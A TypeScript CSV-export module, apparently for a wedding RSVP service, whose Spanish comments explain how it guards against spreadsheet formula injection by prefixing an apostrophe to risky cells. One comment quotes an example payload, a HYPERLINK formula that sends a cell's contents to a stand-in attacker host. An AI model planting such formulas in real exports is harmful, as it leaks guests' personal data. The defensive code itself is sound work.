/** Spreadsheet export. CSV, not a library: it is a comma and a quote rule. */

/**
 * Una celda que empiece por `=`, `+`, `-` o `@` es una FÓRMULA para Excel, para
 * LibreOffice y para Google Sheets, y la ejecutan al abrir el archivo.
 *
 * Aquí importa más que en otros sitios: estas exportaciones llevan nombres de
 * invitados, teléfonos y los enlaces personales de una boda, y el nombre lo
 * escribe cualquiera —incluido el propio invitado, porque el formulario de
 * confirmación es público a propósito—. Un nombre como
 * `=HYPERLINK("https://malo.example/"&A2,"Confirmar")` convierte la lista del
 * cliente en una hoja que filtra sus datos con un clic.
 *
 * Se antepone un apóstrofo, que es lo que esas tres hojas de cálculo entienden
 * como «esto es texto» y no se ve al leerlo. Se comprueba tras quitar espacios
 * y comillas iniciales, porque `  =1+1` también se ejecuta.
 */
const FORMULA_START = /^[\s"'`]*[=+\-@\t\r]/;

function neutralise(text: string): string {
  return FORMULA_START.test(text) ? `'${text}` : text;
}

function cell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '""';
  // Un número lo escribe este programa, no una persona: neutralizarlo
  // convertiría un `-5` en texto y la columna dejaría de sumar.
  if (typeof value === 'number') return `"${value}"`;
  return `"${neutralise(value).replace(/"/g, '""')}"`;
}

/**
 * Excel only reads UTF-8 correctly when the file starts with a byte-order mark,
 * and Arabic names are the whole point of this product — so the BOM stays.
 */
export function buildCsv(headers: string[], rows: (string | number | null)[][]): string {
  const lines = [headers.map(cell).join(','), ...rows.map((row) => row.map(cell).join(','))];
  return `﻿${lines.join('\r\n')}\r\n`;
}
